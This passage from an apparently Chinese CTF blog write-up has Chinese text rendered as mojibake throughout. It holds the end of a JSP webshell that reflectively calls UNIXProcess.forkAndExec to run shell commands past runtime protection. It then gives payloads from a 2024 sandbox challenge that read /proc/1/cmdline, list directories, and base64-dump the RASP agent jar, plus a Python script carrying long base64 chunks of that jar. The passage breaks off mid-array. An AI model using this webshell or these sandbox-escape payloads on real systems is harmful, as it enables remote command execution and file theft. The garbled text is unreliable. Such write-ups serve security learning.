class="hljs-type">int</span>      <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-type">int</span>[] envc                 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds              = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-comment">//æ„é€ forkAndExecéœ€è¦çš„å‚æ•°</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span>      <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);<br>        launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);<br>        helperpathField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//ä»UNIXProcessä¸­å¾—åˆ°launchMechanismå’ŒHelperpath</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);<br>        <span class="hljs-type">byte</span>[] helperpathObject      = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);<br>       <span class="hljs-comment">//åå°„forkAndExecæ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,<br>                <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class<br>        &#125;);<br>        forkMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        &#125;);<br>        <span class="hljs-comment">// åˆå§‹åŒ–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå°†æœ¬åœ°å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºæµè½¬æ¢ä¸ºç¨‹åºæ‰§è¡Œç»“æœçš„è¾“å‡ºæµ</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);<br>        initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        initStreamsMethod.invoke(processObject, std_fds);<br>        <span class="hljs-comment">//è·å–è¾“å‡ºå†…å®¹</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>    <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(b, <span class="hljs-number">0</span>, a);<br>        &#125;<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        out.println(baos.toString());<br>        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h1 id="ä¾‹é¢˜åˆ†æ"><a href="#ä¾‹é¢˜åˆ†æ" class="headerlink" title="ä¾‹é¢˜åˆ†æ"></a>ä¾‹é¢˜åˆ†æ</h1><h2 id="mrctf-2022-springcoffee"><a href="#MRCTF-2022-springcoffee" class="headerlink" title="[MRCTF 2022] springcoffee"></a>[MRCTF 2022] springcoffee</h2><h2 id="å¼ºç½‘æ‹Ÿæ€2024-onlinerunner"><a href="#å¼ºç½‘æ‹Ÿæ€2024-OnlineRunner" class="headerlink" title="å¼ºç½‘æ‹Ÿæ€2024 OnlineRunner"></a>å¼ºç½‘æ‹Ÿæ€2024 OnlineRunner</h2><p>è®°å¾—å½“æ—¶é¢˜ç›®æ˜¯ä¸€ä¸ªåœ¨çº¿çš„javaåœ¨çº¿å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œç›´æ¥è®©ä½ å†™Mainå‡½æ•°çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥ä¹Ÿæ²¡åŠæ³•importç±»ï¼Œåªèƒ½ç›´æ¥å†™å…¨ç±»å</p><p>å½“æ—¶å°±æ˜¯å°è¯•äº†ä¸€ä¸‹æ­£å¸¸å‘½ä»¤æ‰§è¡Œpayloadå‘ç°ä¸å¤ªè¡Œï¼Œjavaæ²™ç®±ä¹Ÿä¸å¤ªä¼šç»•ä¸è¿‡å»ï¼Œé‚æ‘†ğŸ«¡</p><p>è¿™é¢˜æ²¡æœ‰é™„ä»¶ï¼Œå½“æ—¶ä¹Ÿæ²¡æ€ä¹ˆçœ‹ï¼Œç°åœ¨åªèƒ½çœ‹wpå­¦ä¹ ä¸€ä¸‹</p><p>å…ˆæ˜¯ç”¨ä¸‹é¢çš„payloadä»»æ„æ–‡ä»¶è¯»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            java.io.<span class="hljs-type">FileReader</span> <span class="hljs-variable">fr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileReader(<span class="hljs-string">&quot;/proc/1/cmdline&quot;</span>);<br>            java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(fr);<br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>        &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå¾—åˆ°å¯åŠ¨æœåŠ¡çš„å‚æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java--add-opens=java.base/java.lang=ALL-UNNAMED-javaagent:/home/ctf/sandbox/lib/sandbox-agent.jar-jar/app/app.jar--server.port=80<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯ç»™æ²™ç®±ä¸Šäº†ä¸€ä¸ªagentæ¥æ£€æµ‹ç¨‹åºï¼Œä¹Ÿå°±æ˜¯RASPäº†</p><p>ç„¶åç”¨ä¸‹é¢çš„payloadæ¥åˆ—ç›®å½•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.io.<span class="hljs-type">File</span> <span class="hljs-variable">folder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">&quot;/&quot;</span>);<br>        java.io.File[] listOfFiles = folder.listFiles();<br><br>        <span class="hljs-keyword">if</span> (listOfFiles != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (java.io.File file : listOfFiles) &#123;<br>                <span class="hljs-keyword">if</span> (file.isFile()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;File: &quot;</span> + file.getName());<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file.isDirectory()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Directory: &quot;</span> + file.getName());<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;The directory does not exist or is not a directory.&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢çš„payloadçœ‹jaråŒ…çš„æ¡ç›®ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ä¸€äº›åŒ…å«çš„æ–‡ä»¶å’Œç›®å½•ä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    java.util.zip.<span class="hljs-type">ZipInputStream</span> <span class="hljs-variable">zis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.zip.ZipInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(<span class="hljs-string">&quot;/app/app.jar&quot;</span>));<br>    java.util.zip.ZipEntry entry;<br>    <span class="hljs-keyword">while</span> ((entry = zis.getNextEntry()) != <span class="hljs-literal">null</span>) &#123;<br>        System.out.println(entry.getName());<br>        zis.closeEntry();<br>    &#125;<br>    zis.close();<br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨ä¸‹é¢çš„payloadä¸‹è½½agent.jarç„¶ååç¼–è¯‘æŸ¥çœ‹æºç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    java.io.<span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">&quot;/home/ctf/sandbox/lib/sandbox-agent.jar&quot;</span>); <span class="hljs-comment">// éœ€è¦è¯»å–çš„äºŒè¿›åˆ¶æ–‡ä»¶</span><br><br>    java.io.<span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(file));<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå­—èŠ‚æ•°ç»„ä½œä¸ºç¼“å†²åŒº</span><br>            <span class="hljs-type">int</span> bytesRead;<br><br>            <span class="hljs-keyword">while</span> ((bytesRead = bis.read(buffer)) != -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// å¾ªç¯è¯»å–</span><br>                <span class="hljs-comment">// å¤„ç†è¯»å–çš„æ•°æ®ï¼ˆè¿™é‡Œå¯ä»¥è¿›è¡Œæ‰“å°ã€å¤„ç†ç­‰ï¼‰</span><br>                <span class="hljs-comment">//System.out.write(buffer, 0, bytesRead);</span><br>System.out.print(<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>                System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));<br>System.out.println(<span class="hljs-string">&quot;\&quot;,&quot;</span>);<br><br>            &#125;<br><br><br>        &#125; <span class="hljs-keyword">catch</span> (<br>java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>ç„¶åpythonè„šæœ¬å†™å…¥jaråŒ…</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>data = [<span class="hljs-string">&quot;UEsDBAoAAAAAAAsdRlkAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBAoAAAAIAAodRllB90L8xgAAAFMBAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUadj8FOwzAQRO+R8g/+gbVacUDKre0NEVSBxH0TT4ghXiN7E6V/j9sq4sKJ486M3uy0LH5AVnpHyj5KY/Z2V1eH1I9+QfqVzxPWOZvNqKtTAiscHS+NOXxzP8K0vEDq6jj7SW96uGTv7oKjJ/dV6I92Z/cPBC4lHxCl08Q5N6aPwfLkO+7Yfi7BZhbXxdXyNWRv0WeepdRcu1noFQ6DF9wBKAhNMzZPE0seYgp/2W9QemEtO6iFjtHRORXWumXKFdjLv16rqx9QSwMECgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAABjb20vUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAMAAAAY29tL2FsaWJhYmEvUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAQAAAAY29tL2FsaWJhYmEvanZtL1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAHgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAwQKAAAACAAKHUZZjfQUsW8FAADNCwAANgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc5VWXVcTVxTdF0IGwigaCBRBSykgCWisrVYBrRWhYgNaoliktr0kAwxMZtKZCWq/1+qfaH9AV19xrVZau+xjH/pv+u5qu+9kEgKEpX3IzM255+x9Pu+dv/55+geAS/hWQ4OAvi43Zdo2/PSd+UycGxEdTYgKdBXkhjHp2Dnp3zX9Na48X9q+JzA0nAmMLGmvprO+a9qr48n9ohgEmnW0ICYQnTBt078skKhnuxCDjkMaDivtNlLX+jRpSc/LODJvuALx4aVM7SZtm3FUIJmVdn7ZeVijvGTLguEVZc64NOiNF6W/pt73NbQLHNnx4ebyupHzY0igU0OXjlfQvWu/7CMjWHHcgvQFLtaJYCmzF7BeQlrQg14Nx3WcwKsCZ3JOIS0tc1kuy/T6ZiHtlWNIy1XD9tP7I2I6fafiT7xewnvwmo5+vM6yrph2ft7wnJKbMwT6Dy5ZJZOqBoM6hpR166rhV4wV6rCOJFICh2pR2QkjB8OWfNNKT9mlguFK33TsAH9UxymFo9fge4ogreMM3hBoUwRBtPkgcIHBFzRboBaE/g==&quot;</span>,<br><span class="hljs-string">&quot;po63FEaLwgjESnpex9u4QEqXfNamEcJ2DO/DSC5oGBNo35FPPcwZReW88n1C58ywg1ssuhei1JuEe/u9a8UVvKvhqo5JXBM4GuybDncdz5DLFgvUlFNrgcZh5cb0Ljdur7nOg7LayTqE9QZKIDLp5GnQljFtY65UWDbc22WIeMbJSWtBuqb6Hwoj/prJeM5m/m9PjjMh1UET6Az1Jx3XuCHdadMybnHyBGLVXHoaPhA4Ue29WWmp0TLybMKqEj1SqMxHybUEDu9uVTZi1pe5jVlZrPhPNfrfdUDv0bHdUT8qViI/Wd9kYjfj5XENSzy96upquF+pF4s6c7MmipasuWpLv+SSafzlh2UfO88fGfbc0X3tJSAIn8jUaVzuaWHjU+seJ9uqHa6OvVgTKRWpyb7Zs6FhQ6Bvj3DO8aedkp2vCTj5UhOhaNQM1jkkSR2MwszKLcfzzKBGsWxwUqhuYo33N+FphcJT+6rj+J7vyuKs4a85ea8tCp4BPkoaNtWt9kBgYIfQtDedDSPkLV900zLnO+4jge9rwwgVy6DXyW4Z3kDGcTZKxTrDd5Ch6rk66i+4OkKISWlZWdM3xpvxSN1FzMSY4KE2Y9uGG2TCYIm+5HH5Um5r+LoyggeqkqasjD4eozq/DHh2qJuLqyh/LXgPDbjOlQ8NjXyfTkWeQSw2/s7H6FMl2oaW3UZrKn6k6Rnii40j2cXIaPZXdPyCY49p0YAZPg8H1h28ehO8Hjpxg//6yoh4HxkgWM2SWQSrOa4acFN9q1Byiz9eWnwqXz7jjrJMpEaeoG9WjP6IptGt1Mg2BmZHt7jRGFB2shuAYwykB63oxSEG1k7YHepElTqB+YA6ijZkcZsEdyhthniuvlk4VupOo42i/66W/mQt/UiZPlJDP0DIQdIPkX6Y9MkX0i/gLgk+pFSvShb3OHSvmpmP8HGQ40/IxKsrdPFvvhV7Url4eu7Un2g6taXWZ8civT+gJdUdeYJz3ZGtsUhqpHcb41uE0ulCHy6G7g+x+KoQUaQR48WtLt52nEMXzuM4LgSa/RgLwrlMrXYG+CkkrfvZKsvIcUUHqiEmwxDVKg+DLkdZ0BVaNAbBdlJSxlilZXlvlXsq7H40PoeuYe05jvD5L1UjGno0JAT/go+L1YSshwmxuD6BQtgy6aCGQFPqZxzbqnZlNBBeCYLQywqhwwI2roXGC3w38N2a+g3vCPyESOZxoBxljqbCbosH8c5TdofSLHO2UAPbGsKqaPhJPqPRjoZO4EmRHR3UFi5/D/E5/6kP6y/wFb5B939QSwMECgAAAAgACh1GWZNuBnUfFgAAyS8AADEAAABjb20vYWxpYmFiYS9qdm0vc2FuZA==&quot;</span>,<br><span class="hljs-string">&quot;Ym94L2FnZW50L0FnZW50TGF1bmNoZXIuY2xhc3OtWgl8VNXVP2cykzeZvJAwASQgEpA1q4KghEWSkJBANjMBDKDxkbwkA5OZdGYCpLZudana2iq2Fdxaa0sX2yK0Q4AK2r22drG2dret3fddbal8/3Pfm5mXZNj69Se+9+69557tnvVOnn396HEiWumaoJGLqbQ7MlBphILbjG1G5fadA5UxI9yzLbK70ugzw/HKank2GUPh7n4z6iM3eTTK1kkjL1PBdmOnURkywn2Vrdu2m91xpuwVwXAwvoopa8HCjTnko1yNdJ3yaAKTrsCDkcr6YMhkyouZg0bUiEeitf1GlIlr/WCrQKeJ5Ge6YMDYYdZGwt1GfFMw3o+vWNwIx2NM8xc0pekG4tFguG957cLxc34Ch8LCZJ2m0AVMOSmCTP5M8C4qEurTmJZlojF+KiPVLCrygfQMnS6imUwT+8x4wFJpbW9fmxHvZ5qXAX1GXG6aJRzNZroiw5ZzROKhAi/NZfKoE80Bb/N1WiAayW2q3tBS29DV3LqmTngu0amUynBS8Ui9acSHomazMch08enZHYoHQ5UAWi7bK3SqpEuYtKAcVijEFFgwBsyBSICiQwNiZI2pTyMejISTyMOmLEF9ke4dZry6pydqxmLLvbQIdmbE40Z3v1C9TKcltBRMQ9EtxoAZGzS6zTTTKdIZdCPbr9BpmWz3YntHZIcZlsnlOq2glTi8XdFg3KxWtNrN2FAIJl57TidxJgnEM5iu1Gm1HEJBe11gQ1NHV31jU11XW3VHgw82WyMuVss0OZPqNwpEnU71tBaaMHcHY+IX8LjNstCo0zq1EIyJo8lUk07NMuXtNsKbRCKNWpmmpTG3D4XjwQGzbne3OSgn4Kdsukosr51pts2C7biZ9dhCNRptgF85QRUpBI0O2iTiXI3lMbg2L9zopc04u7mx5cl/Ph9tpWs0ulanLrouyWZGTcKCcWoNkZg6eKZJCzIyt5W26dRNPbBMgLdFonGlrUYf9VKfRv06BWk7Dju9tTEcN/tMxAltpxEaMlt7maYsaHQityGAPUQDGoV1itDgqJBokcc59EaiA0Y8c1DZ4piyYmhm/XZQVKcYSYQ1BgfNMGQpcaKTEBow3zBkhrtTJwQlWyeg9u/UaZcEbU9vaCjWLzPDOr1RzXSHIjGYxJuYCtMYO/qjkV3GNjGg6+kGnW6kmxCzjZ6ewNDgoCjfBA9TnTykdsBCNboliQ1sNLamLEtM5VaxhpvEB27X6Q56K8zcTjq1ISMWa4oYPWZURZ78MT6cS3fR3Rq9Tae30z1gZ9QqrKE7ghCCwLLeHB7jO0nlbhYU79TpXroPRgBzGBONMxyCPQ==&quot;</span>,<br><span class="hljs-string">&quot;pdH9TJecOVsGxonhoz30bpH3PZkzVyb3Fhb36rSPHgSLg0PxMdHf5uecmPbSw0yLwXSFzXQFmK6wma7ojkTNipgZ3WlGK9qikd3DtZgIqLHw/ahO76X3IXGGIIqSiWnuWVKXAgPZ98N3ekyE9ciwRh/ASY4B8dHjtF+nD9GHgR/H0GzG+yOwqNVncRILv5Ni1OwNQdRKCwNIf9QKC42qYuiG/X6MPq7RJ3Q6QE/CZE+3UyJmeCcywBhPtTV5Fk+1p0Rth3T6pPhVvvKrxt62SCwWhFvIsSZ0OiyWlx01ByI7Tck1R3Q6KglossSmaGTQjMaDpgrdUiwIxKd1ekog8lNp2VKMrJ3Q6WlZm5AuMxoiA/DmzwBj2j22G9HKdUbUSghMn9Pp81KcTErvCgwOA8Ai+Qx9UUz2S4iJY4M/jPNZ+opGX9XpOfoa05xzSehIIlbU6ojURCJxrBmDDh8JmEa0G2XRNGfKdnCsMh7TN3T6pjA92VFRwV5TXDN9S6cX6NsoHsVgW6NrzN5g2HQQYlp53mWUYzts60XE3TN6k3CEYrU32Idj8tH36FGNvp88irEIvfRD2Go8ktrgpR+rxF0TDPdo9JNROQmaC5kGAuhL9DOdXpZ8rm+z5jZKkvLSL5jc27DTS7+y6pmmSLcR8tJvkL1sJoutuqm414BeeyokGv9Ojvr3Y/LJeNU4o7skvT/q9CdJqdkhM9wX7/fSX5BJrt0aK5kjq3/T6e/0D8QAZD50DrHTVDKb5dRe0elVgS0Ixloi8RoA7LDWNfoXzjJtEk3B8A6zp8GI9SPa++g18sj2/+j0umzPg9rSe+F/+E/SM7t0zmI3uIsNhoLxzGF44Zbxc17OBoqVcFv26pwjCteCsbqBwfgw6HKuzrpU5gVQNCzNQHFobURi4wk650tx52oNeHkiwviuYFh4KdR5Ek+WSszOVEzTT5/HN3sZONz9cGhBWqTzNEE6aU1dfbWUjIHqljU1rVd3NbQ2S/3OF+o8gy9i8qVZYlp7hhr8fBoJIVCs8yzRQ04wtgmGFtkV8/LFUhtdGVx47ZbKrVuvWbDFKH/jNQvVt4/n8jyN5+u8gBeOOskoaqfdlXBbVCeIDhpcalA1heVnaTVGbVwuBEp1LuPylKXBxxefrTByYGq2NgFTJV+i8aU6LxL5xrHanETu7hUH48vwNefSqkrZt1TnyyUu6VFzMITeoz4YjcW9vAxqCif7ES8vVwlRnYmX0Vp44tJsePlKJiSLauAbRPAXJdfqvEbwTU3HuXRekFDn5Xr43dzYStTLPm7gRo3XoTrk9UnGHdqrGQqGVOQ7g2bHg8P2m5k6l3f39gmR2HAsbg50DUR6hkKmTOBLvQ==&quot;</span>,<br><span class="hljs-string">&quot;7ajSJRYq4yEUEw4wSLQzCHTynVKF4hpiturcNiYHNaudIqKYe7vOATH3qUkz3xCoa5dedUOqUWLeoPNGwTJllLIUVZUVuIFqvNypun9V5wQHvbwFZ3FJhfpPcFyj87XcBU6sJFUfjQw429/W8ZpLqum/8ayNXjYQ9W12BtGNeLkbgeYSOUpT515perzxSDLHP879OgcZDUqhVSHEUWggqa6JDCCASH9mH2PM7B5CvT9cORYGRhLiAY3DOkcYAl10ZnCEUhCqxREHIkNR6aUvHEcivQrkUY5pHNd5iHcm66sMgFZVJinJKgkKFjja/A3tTUC0m4c1fqPO14sKdOei1brZ/Sy/Wecb+EaLzzYjijLDulJKoUyWKwJ8s863CL6cFLAfCW+Wj2/j2zW+Q+e38p2jGzdl7Tb2lONJs+OMH+kVOMvdQC+2XyGO4OO38z0av0Pndyr7zrTHUoY9HvaTl2ZpvAe9SBoYGQI6FH4ra1OfyeTH95HHy++GWiKxCnEtEeceyTB7dd4n4qKsaIrsMqO1Rgyamei46emqXlvX0gH5kpdqqnyQOzEnTEdHdW0DxAoE+8LKF5g2jDb3FRnM/Xzbo+WrEBcvqG2qDgS6Wuu7alvb6/BoqW9cu6G9DhVhaqWtvfXqTmsdUWBjXTsMpK65raOzK9DR3tiCmF2wvq5zVEaEhDLVUt1cF2irrsV4YjJxOuYUjIWyq7ENuTMJI4N8x2JbazuUpieXrWGOAHS0rq9rAabkkj2eKmvgu62uvaOxLpC+4EGsF7eQ9hb1acvQwDYz2iGllZyBlGwbjWhQxvakO94fhMWUn0W7o65ql0uISfcDMBQ07ZZ3Lz9zoXeme7mNkLLX2YKAOYGH4Z4bBmhMMWtx4ut1hNkpo0UfHkyKv+TsZjduRszK1bsL3jcqINj3IYi2wDs5teS4n8CaJySMIOqd6Q5PVQLC3YTREQcKCqDC3gFGbfZzu50NyKLzdxFVH6k+BxpLMRqTkBNO3bT6x9+gYFKRbu1Vvb3V10soGNtNp7SUnltRIhrkeEpLY3oAOO1peiQ4ok011dUASUS1xzLnaI9GX8PbHTTSXBJ4FNu8WW6qjCGJZv7BcX0y5BIl1Y82zuEF/5Xt/A9uqVGgxWwm8nqc3QEsZsfOgNkneKqjUWMYAmdoPjC7Y2ebEYzaoMnN/lGzCoHGP2JqPPsd/Tk7TtaA+GPWDrlE023m7Rwx8P9W6Pm0HDh15OGi01btabHPk5+MtHKSka0mRTNDycc0dK714P9SOYi83hXdIfvXNZ9VUllVj39U4K+QvXDC1EWLdbsVy8/mv/j4r/w3jf+u00T+x5i7G7n5sqlZP7vVG93xSBQm8MCCpg==&quot;</span>,<br><span class="hljs-string">&quot;cYAW0gbEnJAZm9MUiewYOkv5O2qjRPcM4Ge5Y7NR1CLgBRDHUXe9gpjAjC7Fy69BQcxW7+HlfyOfMCPKsh0Xy9XtzHYj6uX/IB6NXosNDltLpxAKOTldkY4yXhdD6czJhsbrymIqVj8OFccjxVH101CxJITiqmJO3q54XR4cRApfuc2cS1OzqXsj1QjC0xrDYZRrEjvNmObyMc09J7VrLj1Z0p8WFNHIAqZZhMxFRJNpmlwm4GuadFnq/SDezA/h20VzMH7YMb6UfPKbocDJz1bqfQe9FeuPyDo/Cvj3OuC/g/H7HOOHMH4sPeZVGL/fMZ6C8eOO8RUYf8AxrsL4g47x1Rjvd4w3Y/whx/g6jD/sGG/D+COO8QqMPzqGnycc49UY59tysvzcjZWPYVQp10p4e0oOU9aTCvTjeGaryWn8CTx1C4APsKz75Gdge/NlUISs+UoOUs5Ryic6MAbDDAcGHx9UDPikT86MoXA8hlmZMMjFqY3hcspSa3mC4SBNOkpTxyOZ60CSl0Ly+TMgmT4eycJMSORqI4XEZSMZoQsVkuLxSMozItl4OoVcPB7DpRkUksOH+JM2hvXA4MI73z/nEM0DLwtLR6h8U/psJ0BYoq3koWvwfa1CN8Xawp9S6OQrwYdBIodHUojvgKPJzun+S23EzWUjtBj/X14mJEaoSohkKSKzYWFE/SAShKa3Uy7tgH2EaBINgMR2WGFEES62UKYIT7cJ+xDSj8AfXXzUllbN8DEwWiI/ZltM8V5oRQPE/cfI13mQVh2m6pbyBK3ZSzPxathLPrzW76OJx6ils/wotREdpsCJY9TRWe4+TBur3EVuf6f2FLk7s0oCne7SQKenLEFbAp3ZeBkjZAZGaEeC3rCpyJ2gIXns3k9FVR77S6/KLvIUZSfozUWeE/spv8othIqA+i0nnoRsy6iXwnQ9DdIQ7ca7gm6FIm+2tbSO5G9EboB2boTt3wSt3AyN3KKgltFt1ER3UoDuos10Ow7rNjLo7cB3DzDeiv/eCUz3AOIdtIf2KG2ugjaW0Xr+NEMgrPj4OJ9Q8fF+XmZr+H5eKXFBfT3Nz0CfuXQnf4Y/C54+h9m15D1JxRr58k7RlfLnMSH1bytmNOog1uj6U5RD2WMWMK3WvK+Rq0ajm3NxTC/Qt3GAYjsftW1n9UG6reQI3emivVTM1uAdLvoAFaa+n6Y9zftp6jHa01lSepje1SwrZUfogSzaVHYgZWDTICohDE+kh6mIHqGF9H5aTI9DBfuVKkpAcR5gP89fULa9OqWA1fxFpYDFcEC1qsTOIdfCkzRJgya/hKEbANfD5b9MtbYIX7FFaHZy2sSlHyT3k6X+hxL0SHOZ/7Gspw==&quot;</span>,<br><span 